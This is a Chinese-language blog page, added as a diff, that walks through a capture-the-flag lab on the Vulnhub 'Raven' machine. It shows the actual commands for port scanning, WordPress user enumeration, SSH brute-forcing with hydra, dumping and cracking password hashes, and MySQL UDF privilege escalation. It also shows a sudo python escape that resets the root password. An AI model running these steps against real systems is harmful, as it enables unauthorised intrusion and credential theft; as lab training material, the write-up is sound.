@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="privilege_escalation,wordpress,ssh,udf,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="思路 拿到靶机，端口扫描 80端口，查找WEB漏洞 wordpress框架，枚举、爆破、搜cve 22端口，ssh爆破 mysql服务，爆破、拖库、UDF提权 拿到hash，john爆破 sudo -l，root执行后逃逸提权">
+<meta name="keywords" content="privilege_escalation,wordpress,ssh,udf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub Challenging: Raven">
+<meta property="og:url" content="https://exexute.github.io/2019/03/05/Vulnhub-Challenging-Raven/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="思路 拿到靶机，端口扫描 80端口，查找WEB漏洞 wordpress框架，枚举、爆破、搜cve 22端口，ssh爆破 mysql服务，爆破、拖库、UDF提权 拿到hash，john爆破 sudo -l，root执行后逃逸提权">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://i1.bvimg.com/671004/811f2f53af482938.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/ae573c28a23defa1.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/17d4c06d3229bd74.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/c431b8306304db05.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/e12109195e0c000f.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/fdab805f9a32038e.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/b2c89bbfdc5f84f9.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/1b2167602e4efc0f.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/872511302b76108c.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/98579fede17c3d4a.png">
+<meta property="og:updated_time" content="2022-06-24T14:37:08.084Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Vulnhub Challenging: Raven">
+<meta name="twitter:description" content="思路 拿到靶机，端口扫描 80端口，查找WEB漏洞 wordpress框架，枚举、爆破、搜cve 22端口，ssh爆破 mysql服务，爆破、拖库、UDF提权 拿到hash，john爆破 sudo -l，root执行后逃逸提权">
+<meta name="twitter:image" content="http://i1.bvimg.com/671004/811f2f53af482938.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2019/03/05/Vulnhub-Challenging-Raven/">
+
+
+
+
+
+  <title>Vulnhub Challenging: Raven | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2019/03/05/Vulnhub-Challenging-Raven/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Vulnhub Challenging: Raven</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-05T22:00:00+08:00">
+                2019-03-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
+<li>拿到靶机，端口扫描</li>
+<li>80端口，查找WEB漏洞</li>
+<li>wordpress框架，枚举、爆破、搜cve</li>
+<li>22端口，ssh爆破</li>
+<li>mysql服务，爆破、拖库、UDF提权</li>
+<li>拿到hash，john爆破</li>
+<li>sudo -l，root执行后逃逸提权<a id="more"></a>
+</li>
+</ul>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sS -A -p- 10.129.10.32</span><br></pre></td></tr></table></figure>
+<p><img src="http://i1.bvimg.com/671004/811f2f53af482938.png" alt="端口扫描结果"><br>发现22、80、111三个端口,111端口中的rpcbind和status服务都不可利用,直接放弃; 22端口无直接漏洞,待定; 矛头指向80端口.</p>
+<h3 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h3><p>使用浏览器访问80端口, 发现wordpress目录和flag1; 用<code>dirb</code>扫目录,发现<code>/wordpress/wp-content</code>、<code>wordpress/wp-admin</code>、<code>wordpress/include</code>目录;<br>开启<code>wpscan</code>枚举用户<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wpscan --url http://10.129.10.32/wordpress --wp-content-dir wp-content --enumerate u</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i1.bvimg.com/671004/ae573c28a23defa1.png" alt="wpscan"></p>
+<p>枚举之后发现两个用户：michael、steven. 查找wordpress登陆接口无果，决定用两个账号爆破ssh.</p>
+<h3 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hydra -l michael -P /usr/share/wordlists/rockyou.txt -e nsr ssh://10.129.10.32</span><br></pre></td></tr></table></figure>
+<p>发现密码：michael, steven账户爆破30分钟未果, 于是放弃.</p>
+<h3 id="进shell-搜信息"><a href="#进shell-搜信息" class="headerlink" title="进shell, 搜信息"></a>进shell, 搜信息</h3><p>进入shell后, 直接上传linux枚举脚本：LinEnum.sh 查看是否有可利用的地方<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x LinEnum.sh</span><br><span class="line">$ ./LinEnum.sh</span><br></pre></td></tr></table></figure></p>
+<p>内核3.16.0, 无提权漏洞; 操作系统debian 8, 无提权漏洞; michael无可用sudo执行的命令; crontab无用户自定义文件; 发现mysql服务且以root权限启动, 列入首要考虑范围; 其他文件、服务均无明显问题, 遂尝试mysql; 由于存在WEB站点, 因此到站点目录下搜索配置文件, 发现wp-config.php文件, 内容如下:<br><img src="http://i1.bvimg.com/671004/17d4c06d3229bd74.png" alt="wp-content.php"><br>发现mysql数据库密码: <code>R@v3nSecurity</code></p>
+<h3 id="mysql服务-读库-udf提权"><a href="#mysql服务-读库-udf提权" class="headerlink" title="mysql服务, 读库, udf提权"></a>mysql服务, 读库, udf提权</h3><h4 id="读库-破解hash"><a href="#读库-破解hash" class="headerlink" title="读库, 破解hash"></a>读库, 破解hash</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br></pre></td></tr></table></figure>
+<p><img src="http://i1.bvimg.com/671004/c431b8306304db05.png" alt="show databases"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br></pre></td></tr></table></figure>
+<p><img src="http://i1.bvimg.com/671004/e12109195e0c000f.png" alt="show tables"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from wp_users;</span><br></pre></td></tr></table></figure>
+<p><img src="http://i1.bvimg.com/671004/fdab805f9a32038e.png" alt="wp_users data"><br>发现michael、steven用户的密码哈希值, 用john爆破<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vim hash.txt <span class="comment">#复制steven的密码哈希到文件中</span></span><br><span class="line">$ john hash.txt</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i1.bvimg.com/671004/b2c89bbfdc5f84f9.png" alt="Markdown"></p>
+<h4 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看mysql插件地址</span></span><br><span class="line">mysql&gt; select @@plugin_dir;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传udf.so文件到plugin_dir目录中</span></span><br><span class="line">mysql&gt; create table a (cmd LONGBLOB);</span><br><span class="line">mysql&gt; insert into a (cmd) values (hex(load_file(<span class="string">'/tmp/udf.so'</span>)));</span><br><span class="line">mysql&gt; SELECT unhex(cmd) FROM a INTO DUMPFILE <span class="string">'/usr/lib/mysql/plugin/udf.so'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建函数sys_eval</span></span><br><span class="line">mysql&gt;  CREATE FUNCTION sys_eval RETURNS STRING SONAME <span class="string">'udf.so'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断权限</span></span><br><span class="line">mysql&gt; select sys_eval(<span class="string">'id'</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="http://i1.bvimg.com/671004/1b2167602e4efc0f.png" alt="Markdown"></p>
+<p>修改root密码，拿权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sys_eval(<span class="string">'(echo "xxxxxxxx";sleep 1;echo "xxxxxxxx")|passwd &gt; /dev/null'</span>);</span><br></pre></td></tr></table></figure></p>
+<h3 id="sudoers文件配置有误导致提权"><a href="#sudoers文件配置有误导致提权" class="headerlink" title="sudoers文件配置有误导致提权"></a>sudoers文件配置有误导致提权</h3><p>shell下登陆steven账户, 运行LinEnum.sh后发现可用sudo执行python命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo /bin/usr/python</span><br><span class="line"><span class="comment"># 直接修改root密码</span></span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.system(<span class="string">'(echo "xxxxxxxx";sleep 1;echo "xxxxxxxx")|passwd &gt; /dev/null'</span>)</span><br><span class="line"><span class="comment"># 通过pty运行子程序bash</span></span><br><span class="line">&gt;&gt;&gt; import pty</span><br><span class="line">&gt;&gt;&gt; pty.spawn(<span class="string">"bash"</span>)</span><br></pre></td></tr></table></figure></p>
+<h3 id="拿到3个flag"><a href="#拿到3个flag" class="headerlink" title="拿到3个flag"></a>拿到3个flag</h3><p>靶机说明中表示有4个flag, 但是查看root目录中.bash_history后发现某人执行了命令<code>mv flag3.txt flag4.txt</code>, 因此未发现flag3<br><img src="http://i1.bvimg.com/671004/872511302b76108c.png" alt="Markdown"><br><img src="http://i1.bvimg.com/671004/98579fede17c3d4a.png" alt="Markdown"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/privilege-escalation/" rel="tag"># privilege_escalation</a>
+          
+            <a href="/tags/wordpress/" rel="tag"># wordpress</a>
+          
+            <a href="/tags/ssh/" rel="tag"># ssh</a>
+          
+            <a href="/tags/udf/" rel="tag"># udf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/05/cve-2014-0160-心脏滴血漏洞分析/" rel="next" title="cve_2014_0160_心脏滴血漏洞分析">
+                <i class="fa fa-chevron-left"></i> cve_2014_0160_心脏滴血漏洞分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/20/dirb最佳实践/" rel="prev" title="dirb实战">
+                dirb实战 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#思路"><span class="nav-number">1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#端口扫描"><span class="nav-number">2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#80端口"><span class="nav-number">3.</span> <span class="nav-text">80端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh爆破"><span class="nav-number">4.</span> <span class="nav-text">ssh爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#进shell-搜信息"><span class="nav-number">5.</span> <span class="nav-text">进shell, 搜信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql服务-读库-udf提权"><span class="nav-number">6.</span> <span class="nav-text">mysql服务, 读库, udf提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#读库-破解hash"><span class="nav-number">6.1.</span> <span class="nav-text">读库, 破解hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#udf提权"><span class="nav-number">6.2.</span> <span class="nav-text">udf提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudoers文件配置有误导致提权"><span class="nav-number">7.</span> <span class="nav-text">sudoers文件配置有误导致提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#拿到3个flag"><span class="nav-number">8.</span> <span class="nav-text">拿到3个flag</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
